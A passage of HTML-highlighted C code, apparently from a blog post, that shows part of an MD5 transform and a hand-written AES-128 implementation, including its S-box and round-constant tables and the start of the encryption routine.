class="comment">/* 35 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">14</span>], <span class="number">23</span>, <span class="number">0xfde5380c</span>); <span class="comment">/* 36 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">1</span>], <span class="number">4</span>, <span class="number">0xa4beea44</span>); <span class="comment">/* 37 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">4</span>], <span class="number">11</span>, <span class="number">0x4bdecfa9</span>); <span class="comment">/* 38 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">7</span>], <span class="number">16</span>, <span class="number">0xf6bb4b60</span>); <span class="comment">/* 39 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">10</span>], <span class="number">23</span>, <span class="number">0xbebfbc70</span>); <span class="comment">/* 40 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">13</span>], <span class="number">4</span>, <span class="number">0x289b7ec6</span>); <span class="comment">/* 41 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">0</span>], <span class="number">11</span>, <span class="number">0xeaa127fa</span>); <span class="comment">/* 42 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">3</span>], <span class="number">16</span>, <span class="number">0xd4ef3085</span>); <span class="comment">/* 43 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">6</span>], <span class="number">23</span>, <span class="number">0x4881d05</span>); <span class="comment">/* 44 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">9</span>], <span class="number">4</span>, <span class="number">0xd9d4d039</span>); <span class="comment">/* 45 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">12</span>], <span class="number">11</span>, <span class="number">0xe6db99e5</span>); <span class="comment">/* 46 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">15</span>], <span class="number">16</span>, <span class="number">0x1fa27cf8</span>); <span class="comment">/* 47 */</span></span><br><span class="line">HH(b, c, d, a, x[<span class="number">2</span>], <span class="number">23</span>, <span class="number">0xc4ac5665</span>); <span class="comment">/* 48 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Round 4 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">0</span>], <span class="number">6</span>, <span class="number">0xf4292244</span>); <span class="comment">/* 49 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">7</span>], <span class="number">10</span>, <span class="number">0x432aff97</span>); <span class="comment">/* 50 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">14</span>], <span class="number">15</span>, <span class="number">0xab9423a7</span>); <span class="comment">/* 51 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">5</span>], <span class="number">21</span>, <span class="number">0xfc93a039</span>); <span class="comment">/* 52 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">12</span>], <span class="number">6</span>, <span class="number">0x655b59c3</span>); <span class="comment">/* 53 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">3</span>], <span class="number">10</span>, <span class="number">0x8f0ccc92</span>); <span class="comment">/* 54 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">10</span>], <span class="number">15</span>, <span class="number">0xffeff47d</span>); <span class="comment">/* 55 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">1</span>], <span class="number">21</span>, <span class="number">0x85845dd1</span>); <span class="comment">/* 56 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">8</span>], <span class="number">6</span>, <span class="number">0x6fa87e4f</span>); <span class="comment">/* 57 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">15</span>], <span class="number">10</span>, <span class="number">0xfe2ce6e0</span>); <span class="comment">/* 58 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">6</span>], <span class="number">15</span>, <span class="number">0xa3014314</span>); <span class="comment">/* 59 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">13</span>], <span class="number">21</span>, <span class="number">0x4e0811a1</span>); <span class="comment">/* 60 */</span></span><br><span class="line">II(a, b, c, d, x[<span class="number">4</span>], <span class="number">6</span>, <span class="number">0xf7537e82</span>); <span class="comment">/* 61 */</span></span><br><span class="line">II(d, a, b, c, x[<span class="number">11</span>], <span class="number">10</span>, <span class="number">0xbd3af235</span>); <span class="comment">/* 62 */</span></span><br><span class="line">II(c, d, a, b, x[<span class="number">2</span>], <span class="number">15</span>, <span class="number">0x2ad7d2bb</span>); <span class="comment">/* 63 */</span></span><br><span class="line">II(b, c, d, a, x[<span class="number">9</span>], <span class="number">21</span>, <span class="number">0xeb86d391</span>); <span class="comment">/* 64 */</span></span><br><span class="line">state[<span class="number">0</span>] += a;</span><br><span class="line">state[<span class="number">1</span>] += b;</span><br><span class="line">state[<span class="number">2</span>] += c;</span><br><span class="line">state[<span class="number">3</span>] += d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">FA</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">FB</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">FC</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">FD</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">FE</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">Ff</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Cipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* w)</span>;<span class="comment">//加密 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InvCipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* w)</span>;<span class="comment">//解密 </span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> AesSbox[<span class="number">16</span> * <span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> AesiSbox[<span class="number">16</span> * <span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line"><span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line"><span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line"><span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line"><span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> AesRcon[<span class="number">11</span> * <span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x1b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  <span class="title function_">FA</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span> &#123; <span class="keyword">if</span> (b &lt; <span class="number">0x80</span>) <span class="keyword">return</span> (b &lt;&lt; <span class="number">1</span>);<span class="keyword">else</span> <span class="keyword">return</span> ((b &lt;&lt; <span class="number">1</span>) ^ (<span class="number">0x1b</span>)); &#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  <span class="title function_">FB</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span> &#123; <span class="keyword">return</span>  FA(b) ^ b; &#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  <span class="title function_">FC</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span> &#123; <span class="keyword">return</span>  FA(FA(FA(b))) ^ b; &#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  <span class="title function_">FD</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span> &#123; <span class="keyword">return</span>  FA(FA(FA(b))) ^ FA(b) ^ b; &#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  <span class="title function_">FE</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span> &#123; <span class="keyword">return</span>  FA(FA(FA(b))) ^ FA(FA(b)) ^ b; &#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  <span class="title function_">Ff</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> b)</span> &#123; <span class="keyword">return</span>  FA(FA(FA(b))) ^ FA(FA(b)) ^ FA(b); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>  <span class="title function_">Cipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* exp_key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> round;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ttt[<span class="number">4</span> * <span class="number">4</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> State[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">16</span>;i++)  State[i % <span class="number">4</span>][i / <span class="number">4</span>] = input[i];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = State[i][j] ^ exp_key[<span class="number">4</span> * j + i];</span><br><span class="line"><span class="keyword">for</span> (round = <span class="number">1</span>; round &lt;= <span class="number">9</span>; round++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = AesSbox[State[i][j]];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)ttt[<span class="number">4</span> * i + j] = State[i][j];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt; <span class="number">4</span>;i++)<span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">1</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">2</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">3</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">3</span>) % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)ttt[<span class="number">4</span> * i + j] = State[i][j];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">State[<span class="number">0</span>][j] = FA(ttt[<span class="number">0</span> + j]) ^ FB(ttt[<span class="number">4</span> * <span class="number">1</span> + j]) ^ ttt[<span class="number">4</span> * <span class="number">2</span> + j] ^ ttt[<span class="number">4</span> * <span class="number">3</span> + j];</span><br><span class="line">State[<span class="number">1</span>][j] = ttt[<span class="number">0</span> + j] ^ FA(ttt[<span class="number">4</span> * <span class="number">1</span> + j]) ^ FB(ttt[<span class="number">4</span> * <span class="number">2</span> + j]) ^ ttt[<span class="number">4</span> * <span class="number">3</span> + j];</span><br><span class="line">State[<span class="number">2</span>][j] = ttt[<span class="number">0</span> + j] ^ ttt[<span class="number">4</span> * <span class="number">1</span> + j] ^ FA(ttt[<span class="number">4</span> * <span class="number">2</span> + j]) ^ FB(ttt[<span class="number">4</span> * <span class="number">3</span> + j]);</span><br><span class="line">State[<span class="number">3</span>][j] = FB(ttt[<span class="number">0</span> + j]) ^ ttt[<span class="number">4</span> * <span class="number">1</span> + j] ^ ttt[<span class="number">4</span> * <span class="number">2</span> + j] ^ FA(ttt[<span class="number">4</span> * <span class="number">3</span> + j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = State[i][j] ^ exp_key[<span class="number">4</span> * ((round * <span class="number">4</span>) + j) + i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = AesSbox[State[i][j]];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)ttt[<span class="number">4</span> * i + j] = State[i][j];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt; <span class="number">4</span>;i++)<span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">1</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>)State[i][j] = ttt[<span 